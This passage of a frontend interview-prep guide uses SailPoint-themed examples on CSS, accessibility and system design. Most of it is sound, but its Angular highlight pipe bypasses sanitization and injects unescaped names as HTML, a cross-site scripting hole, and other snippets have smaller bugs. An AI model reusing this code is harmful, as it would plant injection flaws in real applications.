  height: 100vh;
}

.dashboard-header  { grid-area: header; }
.dashboard-sidebar { grid-area: sidebar; }
.dashboard-main    { grid-area: main; }
.dashboard-panel   { grid-area: panel; }
.dashboard-footer  { grid-area: footer; }

/* Responsive card grid */
.identity-card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 16px;
}
```

| Aspect | Flexbox | Grid |
|--------|---------|------|
| Dimension | 1D (row or column) | 2D (rows and columns) |
| Content-driven | ✅ Items determine size | ❌ Grid defines size |
| Layout-driven | ❌ | ✅ Grid defines structure |
| Best for | Navbars, toolbars, inline items | Dashboards, page layouts, card grids |
| Alignment | `justify-content`, `align-items` | `justify-items`, `align-items`, `place-items` |
| Overlap | Not possible | `grid-area` overlap possible |

**Rule of thumb:** Use Flexbox for components, Grid for page layouts. They work great together.

---

### Q31: Compare CSS-in-JS vs CSS Modules vs Utility-first CSS (Tailwind).

**Answer:**

```javascript
// 1. CSS-IN-JS (Styled Components — used in SailPoint/Flare design system)
import styled from 'styled-components';

const IdentityCard = styled.div`
  padding: ${({ theme }) => theme.spacing.md};
  border-radius: 8px;
  background: ${({ $isHighRisk }) => $isHighRisk ? '#fee' : '#fff'};
  border: 1px solid ${({ theme }) => theme.colors.border};

  &:hover {
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  }
`;

// Usage: <IdentityCard $isHighRisk={riskScore > 75} />
```

```css
/* 2. CSS MODULES — scoped CSS with auto-generated class names */
/* IdentityCard.module.css */
.card {
  padding: 16px;
  border-radius: 8px;
}
.card.highRisk {
  background: #fee;
}
```

```javascript
import styles from './IdentityCard.module.css';
// <div className={`${styles.card} ${isHighRisk ? styles.highRisk : ''}`} />
```

```html
<!-- 3. UTILITY-FIRST (Tailwind CSS) -->
<div class="p-4 rounded-lg border border-gray-200 hover:shadow-md
            {{ isHighRisk ? 'bg-red-50' : 'bg-white' }}">
</div>
```

| Aspect | CSS-in-JS | CSS Modules | Tailwind |
|--------|-----------|-------------|----------|
| Scoping | ✅ Auto | ✅ Auto | ❌ Global utilities |
| Dynamic styles | ✅ Props-based | ❌ Class toggling | ❌ Class toggling |
| Bundle size | Larger (runtime) | Small | Small (purged) |
| Performance | Runtime cost | Zero runtime | Zero runtime |
| DX | Great (co-located) | Good | Fast prototyping |
| Theming | ✅ Built-in | Manual | ✅ Config-based |
| SSR | Needs setup | ✅ Works | ✅ Works |

**SailPoint Context:** SailPoint's Flare design system uses Styled Components for dynamic theming across multi-tenant deployments — each tenant can have custom branding applied via theme props without CSS file changes.

---

### Q32: Explain BEM methodology and its benefits.

**Answer:**

BEM (Block, Element, Modifier) is a CSS naming convention for creating reusable, maintainable components.

```css
/* Block: standalone component */
.identity-card { }

/* Element: part of a block (double underscore) */
.identity-card__header { }
.identity-card__avatar { }
.identity-card__name { }
.identity-card__risk-badge { }

/* Modifier: variation of block or element (double hyphen) */
.identity-card--high-risk { }
.identity-card--compact { }
.identity-card__risk-badge--critical { }
.identity-card__risk-badge--low { }
```

```html
<div class="identity-card identity-card--high-risk">
  <div class="identity-card__header">
    <img class="identity-card__avatar" src="avatar.webp" alt="" />
    <span class="identity-card__name">John Doe</span>
  </div>
  <span class="identity-card__risk-badge identity-card__risk-badge--critical">
    High Risk
  </span>
</div>
```

**Benefits:** Flat specificity (all single class), self-documenting, avoids nesting conflicts, scales well in large codebases. **Drawback:** Verbose class names — mitigated by CSS Modules or preprocessors.

---

### Q33: Explain Responsive Design patterns and Container Queries.

**Answer:**

```css
/* MEDIA QUERIES — viewport-based responsive design */
.identity-grid {
  display: grid;
  grid-template-columns: 1fr;
  gap: 16px;
}

@media (min-width: 768px) {
  .identity-grid { grid-template-columns: repeat(2, 1fr); }
}

@media (min-width: 1200px) {
  .identity-grid { grid-template-columns: repeat(3, 1fr); }
}

/* CONTAINER QUERIES — component-based responsive design (modern CSS) */
.dashboard-widget {
  container-type: inline-size;
  container-name: widget;
}

@container widget (min-width: 400px) {
  .identity-summary {
    display: flex;
    flex-direction: row;
  }
}

@container widget (max-width: 399px) {
  .identity-summary {
    display: flex;
    flex-direction: column;
  }
}
```css
/* Fluid typography with clamp() */
.dashboard-title {
  font-size: clamp(1.25rem, 2vw + 0.5rem, 2rem);
  /* min: 1.25rem, preferred: 2vw + 0.5rem, max: 2rem */
}

/* Responsive patterns */
/* 1. Fluid grid with minmax */
.card-grid {
  grid-template-columns: repeat(auto-fit, minmax(min(100%, 300px), 1fr));
}

/* 2. Responsive sidebar layout */
.layout {
  display: grid;
  grid-template-columns: fit-content(250px) minmax(0, 1fr);
}

/* 3. Aspect ratio for responsive media */
.video-container {
  aspect-ratio: 16 / 9;
  width: 100%;
}
```

| Approach | Based On | Use Case |
|----------|----------|----------|
| Media Queries | Viewport size | Page-level layout changes |
| Container Queries | Parent container size | Component-level responsiveness |
| `clamp()` | Viewport + constraints | Fluid typography, spacing |
| `auto-fit`/`auto-fill` | Available space | Self-adjusting grids |

**SailPoint Context:** Container queries are ideal for SailPoint's dashboard widgets — the same identity summary component can adapt its layout whether it's in a full-width main panel or a narrow sidebar, without knowing about the viewport size.

---

## Section 6: HTML & Accessibility

### Q34: Why does Semantic HTML matter? What are the key semantic elements?

**Answer:**

Semantic HTML uses elements that convey meaning about the content structure, improving accessibility, SEO, and maintainability.

```html
<!-- ❌ NON-SEMANTIC (div soup) -->
<div class="header">
  <div class="nav">
    <div class="nav-item">Dashboard</div>
    <div class="nav-item">Identities</div>
  </div>
</div>
<div class="content">
  <div class="sidebar">...</div>
  <div class="main">
    <div class="article">
      <div class="title">Access Review</div>
      <div class="text">Review pending certifications...</div>
    </div>
  </div>
</div>

<!-- ✅ SEMANTIC -->
<header>
  <nav aria-label="Main navigation">
    <ul>
      <li><a href="/dashboard">Dashboard</a></li>
      <li><a href="/identities" aria-current="page">Identities</a></li>
    </ul>
  </nav>
</header>
<main>
  <aside aria-label="Filters">...</aside>
  <article>
    <h1>Access Review</h1>
    <p>Review pending certifications...</p>
    <section aria-labelledby="pending-heading">
      <h2 id="pending-heading">Pending Items</h2>
      <table>
        <caption>Certification items requiring review</caption>
        <!-- table content -->
      </table>
    </section>
  </article>
</main>
<footer>
  <p>&copy; SailPoint Technologies</p>
</footer>
```

**Key semantic elements:** `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<aside>`, `<footer>`, `<figure>`, `<figcaption>`, `<details>`, `<summary>`, `<time>`, `<mark>`, `<dialog>`.

**Benefits:** Screen readers use landmarks for navigation, search engines understand content hierarchy, and developers can understand structure at a glance.

---

### Q35: Explain ARIA roles, states, and properties. When should you use ARIA?

**Answer:**

ARIA (Accessible Rich Internet Applications) adds semantic information to elements that lack native accessibility.

**First Rule of ARIA:** Don't use ARIA if a native HTML element can do the job.

```html
<!-- ❌ BAD: Using ARIA when native element works -->
<div role="button" tabindex="0" aria-pressed="false" onclick="toggle()">
  Toggle
</div>

<!-- ✅ GOOD: Use native element -->
<button type="button" aria-pressed="false" onclick="toggle()">
  Toggle
</button>

<!-- ARIA Roles — define what an element IS -->
<div role="alert">Your access request has been approved.</div>
<div role="status">Loading identities... 45% complete</div>
<div role="tablist">
  <button role="tab" aria-selected="true" aria-controls="panel-1">Overview</button>
  <button role="tab" aria-selected="false" aria-controls="panel-2">Entitlements</button>
</div>
<div role="tabpanel" id="panel-1" aria-labelledby="tab-1">...</div>

<!-- ARIA States — dynamic values that change -->
<button aria-expanded="false" aria-controls="dropdown-menu">
  Actions ▾
</button>
<ul id="dropdown-menu" role="menu" aria-hidden="true">
  <li role="menuitem">Approve</li>
  <li role="menuitem">Revoke</li>
  <li role="menuitem">Reassign</li>
</ul>

<!-- ARIA Properties — static relationships -->
<label id="search-label">Search Identities</label>
<input type="search"
       aria-labelledby="search-label"
       aria-describedby="search-help"
       aria-autocomplete="list"
       aria-controls="search-results" />
<p id="search-help">Search by name, email, or employee ID</p>

<!-- Live regions — announce dynamic content changes -->
<div aria-live="polite" aria-atomic="true">
  <!-- Screen reader announces when content changes -->
  3 identities found matching "admin"
</div>

<div aria-live="assertive">
  <!-- Interrupts current speech — use for urgent alerts -->
  Error: Session expired. Please log in again.
</div>
```

**SailPoint Context:** SailPoint's certification review interface heavily relies on ARIA — tab panels for identity details, live regions for approval status updates, and proper role assignments for the complex data tables showing entitlements and access items.

---

### Q36: Explain keyboard navigation patterns and focus management.

**Answer:**

```javascript
// KEYBOARD NAVIGATION PATTERNS

// 1. Roving tabindex — for composite widgets (toolbars, tab lists, menus)
// Only ONE item in the group has tabindex="0", rest have tabindex="-1"
function RovingTabIndex({ items }) {
  const [activeIndex, setActiveIndex] = useState(0);

  const handleKeyDown = (e) => {
    let newIndex = activeIndex;
    switch (e.key) {
      case 'ArrowRight':
      case 'ArrowDown':
        newIndex = (activeIndex + 1) % items.length;
        break;
      case 'ArrowLeft':
      case 'ArrowUp':
        newIndex = (activeIndex - 1 + items.length) % items.length;
        break;
      case 'Home':
        newIndex = 0;
        break;
      case 'End':
        newIndex = items.length - 1;
        break;
    }
    setActiveIndex(newIndex);
  };

  return (
    <div role="tablist" onKeyDown={handleKeyDown}>
      {items.map((item, i) => (
        <button
          key={item.id}
          role="tab"
          tabIndex={i === activeIndex ? 0 : -1}
          aria-selected={i === activeIndex}
          ref={el => i === activeIndex && el?.focus()}
        >
          {item.label}
        </button>
      ))}
    </div>
  );
}

// 2. Focus trap — for modals and dialogs
function FocusTrap({ children, isOpen }) {
  const trapRef = useRef(null);

  useEffect(() => {
    if (!isOpen) return;
    const trap = trapRef.current;
    const focusable = trap.querySelectorAll(
      'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    const first = focusable[0];
    const last = focusable[focusable.length - 1];

    first?.focus();

    const handleTab = (e) => {
      if (e.key !== 'Tab') return;
      if (e.shiftKey && document.activeElement === first) {
        e.preventDefault();
        last.focus();
      } else if (!e.shiftKey && document.activeElement === last) {
        e.preventDefault();
        first.focus();
      }
    };

    trap.addEventListener('keydown', handleTab);
    return () => trap.removeEventListener('keydown', handleTab);
  }, [isOpen]);

  return <div ref={trapRef}>{children}</div>;
}
```javascript
// 3. Focus restoration — return focus after modal closes
function useModalFocus(isOpen) {
  const previousFocus = useRef(null);

  useEffect(() => {
    if (isOpen) {
      previousFocus.current = document.activeElement;
    } else if (previousFocus.current) {
      previousFocus.current.focus(); // Restore focus to trigger element
      previousFocus.current = null;
    }
  }, [isOpen]);
}

// 4. Skip navigation link
// <a href="#main-content" class="skip-link">Skip to main content</a>
// CSS: .skip-link { position: absolute; top: -40px; }
//      .skip-link:focus { top: 0; }
```

**Essential keyboard shortcuts for custom widgets:**

| Widget | Keys |
|--------|------|
| Tabs | Arrow keys to navigate, Enter/Space to select |
| Menu | Arrow keys, Enter to select, Escape to close |
| Dialog | Tab/Shift+Tab to cycle, Escape to close |
| Combobox | Arrow keys, Enter to select, Escape to close |
| Tree view | Arrow keys, Enter to expand/collapse |
| Data grid | Arrow keys to navigate cells, Enter to edit |

**SailPoint Context:** SailPoint's certification review interface must be fully keyboard-navigable — reviewers should be able to approve/revoke access items, navigate between identities, and submit decisions entirely via keyboard for accessibility compliance (WCAG 2.1 AA).

---

### Q37: How do you ensure screen reader compatibility and manage focus in SPAs?

**Answer:**

```javascript
// 1. Route change announcements in SPAs
// SPAs don't trigger page load — screen readers miss navigation
function RouteAnnouncer() {
  const location = useLocation();
  const [announcement, setAnnouncement] = useState('');

  useEffect(() => {
    const pageTitle = document.title;
    setAnnouncement(`Navigated to ${pageTitle}`);
  }, [location]);

  return (
    <div
      role="status"
      aria-live="polite"
      aria-atomic="true"
      className="sr-only" // visually hidden but screen-reader accessible
    >
      {announcement}
    </div>
  );
}

// 2. Visually hidden but accessible (sr-only)
const srOnlyStyles = {
  position: 'absolute',
  width: '1px',
  height: '1px',
  padding: 0,
  margin: '-1px',
  overflow: 'hidden',
  clip: 'rect(0, 0, 0, 0)',
  whiteSpace: 'nowrap',
  borderWidth: 0
};
```javascript
// 3. Dynamic content updates — announce to screen readers
function CertificationStatus({ status, identityName }) {
  return (
    <>
      <span aria-hidden="true">{getStatusIcon(status)}</span>
      <span className="sr-only">
        {`${identityName} certification status: ${status}`}
      </span>
      <div aria-live="polite" role="status">
        {status === 'approved' && `Access approved for ${identityName}`}
        {status === 'revoked' && `Access revoked for ${identityName}`}
      </div>
    </>
  );
}

// 4. Accessible data tables
function IdentityTable({ identities }) {
  return (
    <table role="grid" aria-label="Identity list with risk scores">
      <caption className="sr-only">
        List of {identities.length} identities with their risk scores and status
      </caption>
      <thead>
        <tr>
          <th scope="col" aria-sort="ascending">Name</th>
          <th scope="col">Department</th>
          <th scope="col" aria-sort="none">Risk Score</th>
          <th scope="col">Actions</th>
        </tr>
      </thead>
      <tbody>
        {identities.map(identity => (
          <tr key={identity.id}>
            <th scope="row">{identity.name}</th>
            <td>{identity.department}</td>
            <td aria-label={`Risk score: ${identity.riskScore} out of 100`}>
              {identity.riskScore}
            </td>
            <td>
              <button aria-label={`Review access for ${identity.name}`}>
                Review
              </button>
            </td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}
```

**SailPoint Context:** SailPoint serves government and enterprise clients that mandate WCAG 2.1 AA compliance (Section 508). Every identity governance interface — from access request forms to certification review tables — must be fully accessible to screen reader users.

---

## Section 7: Frontend System Design

### Q38: Explain the RADIO Framework for frontend system design interviews.

**Answer:**

RADIO is a structured approach for frontend system design interviews:

```
R — Requirements Exploration
    - Functional requirements (what the system does)
    - Non-functional requirements (performance, scale, accessibility)
    - Who are the users? How many concurrent users?
    - What devices/browsers must be supported?

A — Architecture / High-Level Design
    - Component hierarchy and data flow
    - Client-server interaction model
    - State management approach
    - Routing strategy

D — Data Model
    - API contracts (request/response shapes)
    - Client-side data structures
    - Caching strategy
    - Normalization vs denormalization

I — Interface Definition (API Design)
    - Component props/interfaces
    - Custom hooks API
    - Event handling contracts
    - Error states and loading states

O — Optimizations & Deep Dives
    - Performance (lazy loading, virtualization, memoization)
    - Accessibility
    - Error handling and resilience
    - Testing strategy
    - Monitoring and observability
```

**Example: Applying RADIO to "Design SailPoint's Certification Review Page"**

```
R: Admin reviews 100-10,000 access items per certification campaign.
   Must support approve/revoke/reassign. Real-time status updates.
   Must work on desktop (1024px+). WCAG 2.1 AA compliant.

A: React SPA with virtualized list, WebSocket for real-time updates,
   Redux for complex state (bulk actions, undo), React Query for API cache.

D: Certification → CertificationItems[] → Identity + Entitlements
   Normalized store: entities by ID, sorted ID arrays for display.

I: <CertificationReview certId={string} />
   useCertificationItems(certId) → { items, loading, error, refetch }
   useBulkActions() → { approve, revoke, reassign, undo }

O: Virtual scroll for 10K+ items, optimistic updates for decisions,
   debounced search/filter, keyboard navigation, error boundaries.
```

---

### Q39: Design a Real-Time Notification System for a SaaS platform.

**Answer:**

```
Requirements:
- Push notifications for access request approvals, certification deadlines, policy violations
- Support 10K+ concurrent users per tenant
- Notification bell with unread count badge
- Toast notifications for urgent alerts
- Notification center with history, mark as read, filters
- Multi-tab synchronization

Architecture:
┌─────────────────────────────────────────────────┐
│  Browser Tab                                     │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐ │
│  │ Toast    │  │ Bell     │  │ Notification  │ │
│  │ Manager  │  │ Badge    │  │ Center Panel  │ │
│  └────┬─────┘  └────┬─────┘  └───────┬───────┘ │
│       └──────────────┼────────────────┘         │
│              ┌───────┴────────┐                  │
│              │ Notification   │                  │
│              │ Store (Zustand)│                  │
│              └───────┬────────┘                  │
│              ┌───────┴────────┐                  │
│              │ WebSocket      │                  │
│              │ Connection     │                  │
│              └───────┬────────┘                  │
└──────────────────────┼──────────────────────────┘
                       │ wss://
               ┌───────┴────────┐
               │ Notification   │
               │ Service (BE)   │
               └────────────────┘
```

```typescript
// WebSocket connection with reconnection logic
class NotificationSocket {
  private ws: WebSocket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  private listeners = new Set<(notification: Notification) => void>();

  connect(tenantId: string, token: string) {
    this.ws = new WebSocket(
      `wss://notifications.sailpoint.com/${tenantId}?token=${token}`
    );

    this.ws.onmessage = (event) => {
      const notification = JSON.parse(event.data);
      this.listeners.forEach(fn => fn(notification));
    };

    this.ws.onclose = (event) => {
      if (!event.wasClean && this.reconnectAttempts < this.maxReconnectAttempts) {
        const delay = Math.min(1000 * 2 ** this.reconnectAttempts, 30000);
        setTimeout(() => {
          this.reconnectAttempts++;
          this.connect(tenantId, token);
        }, delay); // Exponential backoff
      }
    };
  }

  subscribe(listener: (n: Notification) => void) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  disconnect() {
    this.ws?.close(1000, 'User disconnected');
  }
}
```typescript
// Multi-tab synchronization via BroadcastChannel
const channel = new BroadcastChannel('sailpoint-notifications');

channel.onmessage = (event) => {
  if (event.data.type === 'NOTIFICATION_READ') {
    markAsReadLocally(event.data.notificationId);
  }
  if (event.data.type === 'NEW_NOTIFICATION') {
    addNotificationLocally(event.data.notification);
  }
};

// When user reads a notification in one tab, sync to others
function markAsRead(notificationId: string) {
  updateStore(notificationId);
  channel.postMessage({ type: 'NOTIFICATION_READ', notificationId });
}
```

**Key Design Decisions:**
- **WebSocket** over SSE for bidirectional communication (read receipts)
- **BroadcastChannel** for multi-tab sync (avoids duplicate WebSocket connections)
- **Exponential backoff** for reconnection resilience
- **Optimistic updates** — mark as read immediately, sync to server async
- **Notification grouping** — batch similar notifications (e.g., "5 access requests approved")

---

### Q40: Design an Autocomplete/Typeahead Search component.

**Answer:**

```
Requirements:
- Search identities by name, email, employee ID
- Debounced API calls (300ms)
- Keyboard navigation (arrow keys, Enter, Escape)
- Recent searches and popular suggestions
- Highlight matching text
- Accessible (ARIA combobox pattern)
- Handle race conditions (out-of-order responses)
```

```typescript
function useAutocomplete<T>(
  fetchFn: (query: string) => Promise<T[]>,
  options: { debounceMs?: number; minChars?: number } = {}
) {
  const { debounceMs = 300, minChars = 2 } = options;
  const [query, setQuery] = useState('');
  const [results, setResults] = useState<T[]>([]);
  const [loading, setLoading] = useState(false);
  const [activeIndex, setActiveIndex] = useState(-1);
  const [isOpen, setIsOpen] = useState(false);
  const latestRequestRef = useRef(0); // Race condition guard

  const debouncedSearch = useMemo(
    () => debounce(async (searchQuery: string) => {
      if (searchQuery.length < minChars) {
        setResults([]);
        setIsOpen(false);
        return;
      }

      const requestId = ++latestRequestRef.current;
      setLoading(true);

      try {
        const data = await fetchFn(searchQuery);
        // Only update if this is still the latest request
        if (requestId === latestRequestRef.current) {
          setResults(data);
          setIsOpen(data.length > 0);
          setActiveIndex(-1);
        }
      } catch (error) {
        if (requestId === latestRequestRef.current) {
          setResults([]);
        }
      } finally {
        if (requestId === latestRequestRef.current) {
          setLoading(false);
        }
      }
    }, debounceMs),
    [fetchFn, debounceMs, minChars]
  );

  useEffect(() => {
    debouncedSearch(query);
    return () => debouncedSearch.cancel?.();
  }, [query]);

  return { query, setQuery, results, loading, activeIndex,
           setActiveIndex, isOpen, setIsOpen };
}
```tsx
// Accessible Autocomplete Component (ARIA combobox pattern)
function IdentitySearch() {
  const { query, setQuery, results, loading, activeIndex,
          setActiveIndex, isOpen, setIsOpen } = useAutocomplete(
    (q) => fetch(`/api/v3/search?query=${q}&type=identity`).then(r => r.json())
  );

  const handleKeyDown = (e: React.KeyboardEvent) => {
    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setActiveIndex(prev => Math.min(prev + 1, results.length - 1));
        break;
      case 'ArrowUp':
        e.preventDefault();
        setActiveIndex(prev => Math.max(prev - 1, -1));
        break;
      case 'Enter':
        if (activeIndex >= 0) selectIdentity(results[activeIndex]);
        break;
      case 'Escape':
        setIsOpen(false);
        break;
    }
  };

  return (
    <div role="combobox" aria-expanded={isOpen} aria-haspopup="listbox">
      <input
        type="search"
        aria-label="Search identities"
        aria-autocomplete="list"
        aria-controls="search-listbox"
        aria-activedescendant={activeIndex >= 0 ? `option-${activeIndex}` : undefined}
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        onKeyDown={handleKeyDown}
      />
      {loading && <span aria-live="polite">Searching...</span>}
      {isOpen && (
        <ul id="search-listbox" role="listbox" aria-label="Search results">
          {results.map((identity, i) => (
            <li
              key={identity.id}
              id={`option-${i}`}
              role="option"
              aria-selected={i === activeIndex}
              onClick={() => selectIdentity(identity)}
            >
              <HighlightMatch text={identity.name} query={query} />
              <span className="secondary">{identity.email}</span>
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

// Highlight matching text
function HighlightMatch({ text, query }: { text: string; query: string }) {
  const regex = new RegExp(`(${escapeRegex(query)})`, 'gi');
  const parts = text.split(regex);
  return (
    <span>
      {parts.map((part, i) =>
        regex.test(part) ? <mark key={i}>{part}</mark> : part
      )}
    </span>
  );
}
```

**Key Design Decisions:**
- **Race condition handling** via request ID counter (not AbortController alone)
- **Debounce** to avoid excessive API calls
- **ARIA combobox** pattern for screen reader support
- **`aria-activedescendant`** for virtual focus (screen reader follows keyboard)

#### Angular Equivalent — Autocomplete/Typeahead Component

The same autocomplete pattern implemented in Angular using RxJS for debounce, race condition handling via `switchMap`, and the ARIA combobox pattern:

```typescript
// autocomplete.service.ts
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable } from 'rxjs';

export interface Identity {
  id: string;
  name: string;
  email: string;
}

@Injectable({ providedIn: 'root' })
export class IdentitySearchService {
  constructor(private http: HttpClient) {}

  search(query: string): Observable<Identity[]> {
    return this.http.get<Identity[]>(`/api/v3/search`, {
      params: { query, type: 'identity' }
    });
  }
}
```

```typescript
// autocomplete.component.ts
import { Component, OnInit, OnDestroy } from '@angular/core';
import { FormControl } from '@angular/forms';
import { Subject } from 'rxjs';
import {
  debounceTime, distinctUntilChanged, filter,
  switchMap, catchError, takeUntil, tap
} from 'rxjs/operators';
import { of } from 'rxjs';
import { IdentitySearchService, Identity } from './autocomplete.service';

@Component({
  selector: 'app-identity-search',
  templateUrl: './autocomplete.component.html',
  styleUrls: ['./autocomplete.component.scss']
})
export class IdentitySearchComponent implements OnInit, OnDestroy {
  searchControl = new FormControl('');
  results: Identity[] = [];
  loading = false;
  isOpen = false;
  activeIndex = -1;

  private destroy$ = new Subject<void>();

  constructor(private searchService: IdentitySearchService) {}

  ngOnInit(): void {
    this.searchControl.valueChanges.pipe(
      debounceTime(300),
      distinctUntilChanged(),
      filter((query): query is string => typeof query === 'string'),
      tap(query => {
        if (query.length < 2) {
          this.results = [];
          this.isOpen = false;
          this.loading = false;
        }
      }),
      filter(query => query.length >= 2),
      tap(() => this.loading = true),
      // switchMap auto-cancels previous HTTP request — no race conditions
      switchMap(query =>
        this.searchService.search(query).pipe(
          catchError(() => of([]))
        )
      ),
      takeUntil(this.destroy$)
    ).subscribe(results => {
      this.results = results;
      this.isOpen = results.length > 0;
      this.activeIndex = -1;
      this.loading = false;
    });
  }

  onKeyDown(event: KeyboardEvent): void {
    switch (event.key) {
      case 'ArrowDown':
        event.preventDefault();
        this.activeIndex = Math.min(this.activeIndex + 1, this.results.length - 1);
        break;
      case 'ArrowUp':
        event.preventDefault();
        this.activeIndex = Math.max(this.activeIndex - 1, -1);
        break;
      case 'Enter':
        if (this.activeIndex >= 0) {
          this.selectIdentity(this.results[this.activeIndex]);
        }
        break;
      case 'Escape':
        this.isOpen = false;
        break;
    }
  }

  selectIdentity(identity: Identity): void {
    this.searchControl.setValue(identity.name, { emitEvent: false });
    this.isOpen = false;
    // Emit selection to parent via @Output or service
  }

  ngOnDestroy(): void {
    this.destroy$.next();
    this.destroy$.complete();
  }
}
```

```html
<!-- autocomplete.component.html -->
<div class="autocomplete-wrapper"
     role="combobox"
     [attr.aria-expanded]="isOpen"
     aria-haspopup="listbox">

  <input type="search"
         [formControl]="searchControl"
         aria-label="Search identities"
         aria-autocomplete="list"
         aria-controls="search-listbox"
         [attr.aria-activedescendant]="activeIndex >= 0 ? 'option-' + activeIndex : null"
         (keydown)="onKeyDown($event)"
         placeholder="Search by name or email..." />

  <span *ngIf="loading" aria-live="polite" class="loading-indicator">
    Searching...
  </span>

  <ul *ngIf="isOpen"
      id="search-listbox"
      role="listbox"
      aria-label="Search results"
      class="results-list">
    <li *ngFor="let identity of results; let i = index"
        [id]="'option-' + i"
        role="option"
        [attr.aria-selected]="i === activeIndex"
        [class.active]="i === activeIndex"
        (click)="selectIdentity(identity)">
      <span [innerHTML]="identity.name | highlight:searchControl.value"></span>
      <span class="secondary">{{ identity.email }}</span>
    </li>
  </ul>
</div>
```

```typescript
// highlight.pipe.ts — Highlight matching text in results
import { Pipe, PipeTransform } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Pipe({ name: 'highlight' })
export class HighlightPipe implements PipeTransform {
  constructor(private sanitizer: DomSanitizer) {}

  transform(text: string, query: string): SafeHtml {
    if (!query || !text) return text;
    const escaped = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regex = new RegExp(`(${escaped})`, 'gi');
    const highlighted = text.replace(regex, '<mark>$1</mark>');
    return this.sanitizer.bypassSecurityTrustHtml(highlighted);
  }
}
```

**Angular vs React — Key Differences in This Pattern:**

| Aspect | React (above) | Angular |
|---|---|---|
| **Debounce** | Custom `useMemo` + `debounce` utility | Built-in `debounceTime` RxJS operator |
| **Race conditions** | Manual request ID counter | `switchMap` auto-cancels previous requests |
| **Cleanup** | `useEffect` return + `cancel()` | `takeUntil(destroy$)` pattern |
| **Form binding** | `useState` + `onChange` | `FormControl` + `valueChanges` observable |
| **Template** | JSX with inline conditionals | Structural directives (`*ngIf`, `*ngFor`) |
| **Text highlight** | Component with `regex.split()` | Pipe with `innerHTML` binding |
| **ARIA** | Identical combobox pattern | Identical combobox pattern |

**Why `switchMap` is superior for autocomplete:** Unlike the React version which needs a manual request ID counter to handle race conditions, Angular's `switchMap` operator automatically unsubscribes from the previous inner observable when a new value arrives. This means if the user types "abc", the HTTP request for "ab" is cancelled before "abc" fires — zero race conditions with zero boilerplate.

---

### Q41: Design a Data Table with sorting, filtering, pagination, and virtual scroll.

**Answer:**

```
Requirements:
- Display 100-100,000 rows of identity/entitlement data
- Column sorting (single and multi-column)
- Column filtering (text, select, date range)
- Server-side pagination with configurable page size
- Virtual scrolling for large datasets
- Column resizing and reordering
- Row selection (single, multi, select all)
- Keyboard navigation (grid pattern)
- Export to CSV
```

```typescript
// Data Table Architecture
interface DataTableProps<T> {
  columns: ColumnDef<T>[];
  fetchData: (params: FetchParams) => Promise<PagedResponse<T>>;
  pageSize?: number;
  virtualScroll?: boolean;
  selectable?: boolean;
  onSelectionChange?: (selectedIds: string[]) => void;
}

interface FetchParams {
  offset: number;
  limit: number;
  sortBy?: { field: string; direction: 'asc' | 'desc' }[];
  filters?: Record<string, FilterValue>;
  search?: string;
}

interface ColumnDef<T> {
  key: keyof T;
  header: string;
  width?: number;
  sortable?: boolean;
  filterable?: boolean;
  filterType?: 'text' | 'select' | 'date-range' | 'number-range';
  render?: (value: T[keyof T], row: T) => React.ReactNode;
}

// Virtual scroll implementation using Intersection Observer
function useVirtualScroll<T>(items: T[], rowHeight: number, containerHeight: number) {
  const [scrollTop, setScrollTop] = useState(0);

  const totalHeight = items.length * rowHeight;
  const startIndex = Math.floor(scrollTop / rowHeight);
  const endIndex = Math.min(
    startIndex + Math.ceil(containerHeight / rowHeight) + 5, // overscan
    items.length
  );
  const visibleItems = items.slice(startIndex, endIndex);
  const offsetY = startIndex * rowHeight;

  return {
    totalHeight,
    visibleItems,
    offsetY,
    startIndex,
    onScroll: (e: React.UIEvent) => setScrollTop(e.currentTarget.scrollTop)
  };
}
```typescript
// Server-side pagination hook
function usePaginatedData<T>(
  fetchFn: (params: FetchParams) => Promise<PagedResponse<T>>
) {
  const [data, setData] = useState<T[]>([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [params, setParams] = useState<FetchParams>({
    offset: 0, limit: 25, sortBy: [], filters: {}
  });

  useEffect(() => {
    const controller = new AbortController();
    setLoading(true);

    fetchFn(params)
      .then(response => {
        if (!controller.signal.aborted) {
          setData(response.items);
          setTotal(response.totalCount);
        }
      })
      .finally(() => {
        if (!controller.signal.aborted) setLoading(false);
      });

    return () => controller.abort();
  }, [params]);

  return {
    data, total, loading,
    setPage: (page: number) =>
      setParams(p => ({ ...p, offset: page * p.limit })),
    setSort: (sortBy: FetchParams['sortBy']) =>
      setParams(p => ({ ...p, sortBy, offset: 0 })),
    setFilters: (filters: FetchParams['filters']) =>
      setParams(p => ({ ...p, filters, offset: 0 })),
    setPageSize: (limit: number) =>
      setParams(p => ({ ...p, limit, offset: 0 }))
  };
}

// Usage for SailPoint identity table
const columns: ColumnDef<Identity>[] = [
  { key: 'name', header: 'Identity Name', sortable: true, filterable: true },
  { key: 'email', header: 'Email', sortable: true },
  { key: 'department', header: 'Department', filterType: 'select' },
  {
    key: 'riskScore', header: 'Risk Score', sortable: true,
    render: (value) => <RiskBadge score={value as number} />
  },
  {
    key: 'id', header: 'Actions',
    render: (_, row) => (
      <button aria-label={`Review ${row.name}`}>Review</button>
    )
  }
];
```

**Performance Optimizations:**
- Virtual scroll renders only visible rows (~20-30 DOM nodes vs 10,000+)
- `AbortController` cancels in-flight requests when params change
- Debounced filter inputs to reduce API calls
- `React.memo` on row components to prevent unnecessary re-renders
- Column widths calculated once and cached

**SailPoint Context:** SailPoint's admin console displays large identity tables (enterprises can have 100K+ identities). Virtual scrolling with server-side pagination is essential for the identity list, entitlement catalog, and certification item views.

---

### Q42: Compare Micro-frontends vs Monolith vs Monorepo architecture. Design a multi-tenant SaaS dashboard.

**Answer:**

```
Architecture Comparison:

MONOLITH (Single SPA)
├── All features in one codebase
